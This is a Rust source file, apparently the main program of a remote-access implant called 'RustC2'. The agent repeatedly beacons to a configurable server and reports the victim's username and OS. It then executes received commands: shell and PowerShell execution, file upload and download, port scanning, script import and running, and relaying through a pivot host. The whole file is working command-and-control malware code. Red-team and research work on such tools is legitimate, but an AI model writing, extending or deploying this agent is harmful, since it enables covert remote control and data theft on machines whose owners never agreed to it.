use std::{thread,
    io::{Read, Write},
    net::TcpStream,
    process::exit,
    time::Duration,
    collections::HashMap};
use clap::{Command, arg};
mod utils;

use utils::ImportedScript;
use utils::PIVOT_STREAM;
fn main() {
    let mut host = "127.0.0.1".to_string();
    let mut port = "8080".to_string();
    // let mut pivot_port: Option<u16> = None;
    let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();

    let matches = Command::new("RustC2")
    .version("0.1.0")
    .about("RustC2 Client, Used for controlling the agent")
    .arg(arg!(-H --host [IpAddr] "The host ip of the server (default 127.0.0.1)"))
    .arg(arg!(-p --port [PORT] "The port number used by the server (default 8080)"))
    // .arg(arg!(-s --pivotport [PORT] "The port number used for pivoting (default 10000)"))
    .get_matches();

    if let Some(h) = matches.get_one::<String>("host") {
        host = h.to_string();
    }
    if let Some(p) = matches.get_one::<String>("port") {
        port = p.to_string();
    }
    // if let Some(s) = matches.get_one::<String>("pivotport") {
    //     pivot_port = Some(s.parse().expect("Invalid port number"));
    // }
    let username = std::env::var("USERNAME").expect("username variable not set");
    let os = std::env::consts::OS;

    // if let Some(stream) = pivot_port {
    //     let listener = TcpListener::bind(format!("0.0.0.0:{}", stream)).expect("Error setting up listener");
    //     let (mut stream, _) = listener.accept().expect("Error accepting incoming connection");
    //     println!("New client connected");
    //     loop {
    //         let mut buffer = [0; 1024];
    //         let n = match stream.read(&mut buffer) {
    //             Ok(n) => n,
    //             Err(_) => break,
    //         };
    //         let mut command = String::from_utf8(buffer[..n].to_vec()).unwrap();
    //         command = command.replace("||PIVOTCMD|| ", "");
    //         println!("Received command from server: {}", command);
    //         if command.starts_with("||UPLOAD||") {
    //             let output = utils::handle_upload(&mut stream, &command);
    //             match output {
    //                 Ok(_) => {
    //                     println!("Successfully uploaded file");
    //                 }
    //                 Err(_) => {
    //                     println!("Error uploading file");
    //                 }
    //             }
    //         } else if command.starts_with("||DOWNLOAD||") {
    //             utils::handle_download(&mut stream, &command);
    //         } else if command.starts_with("||CMDEXEC||") {
    //             utils::handle_cmd(&mut stream, &command, os.to_string());
    //         } else if command.starts_with("||SCAN||") {
    //             utils::handle_portscan(&mut stream, &command);
    //         } else if command.starts_with("||PIVOT||") {
    //             let stream_clone = stream.try_clone().expect("Error cloning stream");
    //             let result = utils::handle_pivot(stream_clone, &command, &PIVOT_STREAM);
    //             match result {
    //                 Ok(pivot_stream) => {
    //                     stream = pivot_stream;
    //                 }
    //                 Err(_) => {
    //                     println!("Error setting up pivot");
    //                 }
                    
    //             }
    //         } else if command.starts_with("||EXIT||") {
    //             exit(1);
    //         } else {
    //             continue;
    //         }
    //     }
    // } else {
    loop {
        match TcpStream::connect(format!("{}:{}", host, port)) {
            Ok(mut stream) =>  {
                println!("Successfully connected to the server");
                let outinfo = format!("||ACSINFO||{}||{}\r\n", username, os);
                stream.write(outinfo.as_bytes()).unwrap();
                loop {
                    let mut buffer = [0; 1024];
                    let n = match stream.read(&mut buffer) {
                        Ok(n) => n,
                        Err(_) => break,
                    };
                    let command = String::from_utf8(buffer[..n].to_vec()).unwrap();
                    let command_clone = command.clone();
                    print!("\rReceived command from server: {}", command);
                    std::io::stdout().flush().unwrap();
                    let mut stream_to_use = &mut stream;
                    let mut pivot_stream_option = PIVOT_STREAM.lock().unwrap();
                    if command.contains("||PIVOTCMD||") {
                        if let Some(pivot_stream) = pivot_stream_option.as_mut() {
                            stream_to_use = pivot_stream;
                            let mut modified_command = command.clone();
                            modified_command = modified_command.replace("||PIVOTCMD|| ", "");
                            stream_to_use.write(modified_command.as_bytes()).expect("failed to write");
                        } else {
                            stream.write(b"Not using pivot").expect("failed to write");
                            continue;
                        }
                    }
                    if command_clone.starts_with("||UPLOAD||") {
                        let output = utils::handle_upload(stream_to_use, &command_clone);
                        match output {
                            Ok(_) => {
                                println!("Successfully uploaded file");
                            }
                            Err(_) => {
                                println!("Error uploading file");
                            }
                        }
                    } else if command_clone.starts_with("||DOWNLOAD||") {
                        utils::handle_download(stream_to_use, &command_clone);
                    } else if command_clone.starts_with("||CMDEXEC||") {
                        utils::handle_cmd(stream_to_use, &command_clone, os.to_string());
                    } else if command_clone.starts_with("||PSHEXEC||") {
                        utils::handle_psh(stream_to_use, &command_clone);
                    } else if command_clone.starts_with("||SCAN||") {
                        utils::handle_portscan(stream_to_use, &command_clone);
                    } /* else if command_clone.starts_with("||PIVOT||") {
                        let stream_clone = stream.try_clone().expect("Error cloning stream");
                        let output = utils::handle_pivot(stream_clone, &command_clone, &PIVOT_STREAM);
                        match output {
                            Ok(pivot_stream) => {
                                stream = pivot_stream;
                            }
                            Err(_) => {
                                println!("Error setting up pivot");
                            }
                        }
                    } */ else if command.starts_with("||IMPORTSCRIPT||") {
                        let output = utils::handle_import_psh(stream_to_use, &command_clone, &mut imported_scripts);
                        match output {
                            Ok(_) => {
                                println!("Successfully imported script");
                            }
                            Err(_) => {
                                println!("Error importing script");
                            }
                        }
                    } else if command.starts_with("||RUNSCRIPT||") {
                        utils::handle_run_script(&mut stream, &command, &imported_scripts);
                    }
                    else if command_clone.starts_with("||EXIT||") {
                        exit(1);
                    } else {
                        continue;
                    }
                }
            }
            Err(_) => {
                println!("Failed to connect to the server. Retrying in 5 seconds...");
                thread::sleep(Duration::from_secs(5));
            }
        }
    }
}